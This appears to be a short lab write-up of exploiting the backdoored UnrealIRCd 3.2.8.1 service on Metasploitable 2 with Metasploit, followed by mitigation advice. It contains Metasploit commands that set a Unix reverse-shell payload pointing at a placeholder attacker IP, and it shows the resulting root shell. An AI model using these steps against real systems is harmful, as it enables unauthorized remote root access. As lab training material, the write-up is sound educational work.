# UnrealIRCd 3.2.8.1 Backdoor Exploitation

## Project Overview
This project demonstrates the exploitation of a Supply Chain Attack vulnerability in the UnrealIRCd service. The specific version (3.2.8.1) contained a malicious backdoor inserted into the source code archive by attackers, allowing for arbitrary command execution.

## Lab Environment
* **Attacker:** Kali Linux
* **Target:** Metasploitable 2
* **Service:** UnrealIRCd 3.2.8.1
* **Port:** 6667

## Execution & Troubleshooting

### Phase 1: Configuration Error
The initial attempt to run the exploit failed. The Metasploit module does not always default to a specific payload, resulting in a failure to execute commands after triggering the vulnerability.

* **Error Observed:** `[-] Exploit failed: A payload has not been selected.`
* **Root Cause:** The exploit triggered the backdoor but lacked instructions (payload) for the return connection.

### Phase 2: Correction & Access
To resolve the issue, a Unix reverse shell payload was explicitly configured.

* **Correction:** `set PAYLOAD cmd/unix/reverse`
* **Configuration:** `set LHOST <Attacker-IP>`

### Result
Upon re-execution with the correct payload, the backdoor successfully established a reverse connection. Due to the service running with excessive privileges on the target, the resulting shell granted immediate administrative access.

## Proof of Concept
The screenshot below documents the initial error, the configuration fix, and the successful root access.

<img width="650" height="582" alt="Skärmbild_2025-12-29_18-41-55" src="https://github.com/user-attachments/assets/b23c5a72-0465-4663-a370-c67c56301f08" />


* **Command:** `whoami`
* **Result:** `root`

## Mitigation
1. **Verify Integrity:** Always verify the MD5/SHA checksums of downloaded software against the official vendor source to detect tampering.
2. **Least Privilege:** Never run network services (like IRC daemons) as the root user. Create dedicated service accounts with limited permissions.

## Disclaimer
This project is intended for educational purposes only and was performed in an isolated laboratory environment.
